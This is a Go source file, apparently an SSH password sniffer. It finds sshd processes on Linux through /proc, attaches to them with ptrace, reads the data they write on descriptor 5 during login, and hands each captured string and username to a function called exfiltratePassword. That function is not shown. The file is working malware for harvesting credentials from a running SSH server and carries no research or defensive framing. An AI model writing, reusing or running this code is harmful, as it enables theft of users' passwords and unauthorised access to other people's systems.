package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strconv"
	"strings"
	"syscall"
)

func findSSHDProcesses() ([]int, error) {
	var sshdPIDs []int
	dir, err := os.Open("/proc")
	if err != nil {
		return nil, err
	}
	defer dir.Close()
	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}
		if isSSHDProcess(pid) {
			sshdPIDs = append(sshdPIDs, pid)
		}
	}

	return sshdPIDs, nil
}

func isSSHDProcess(pid int) bool {
	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceSSHDProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var status syscall.WaitStatus
	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
	if err != nil {
		return
	}
	var username string
	for {
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}

		if status.Exited() {
			break
		}
		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
			reg := &syscall.PtraceRegs{}
			err := syscall.PtraceGetRegs(pid, reg)
			if err != nil {
				return
			}

			if reg.Orig_rax == 1 {
				buffer := make([]byte, reg.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(reg.Rsi), buffer)
				if err != nil {
					return
				}
				cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
				matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
				if len(matches) == 2 {
					username = string(matches[1])
				}
				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
					excludeString := "\\x00\\x00\\x00.\\f"
					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
						go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"), username)
					}
				}

			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}
	}
}
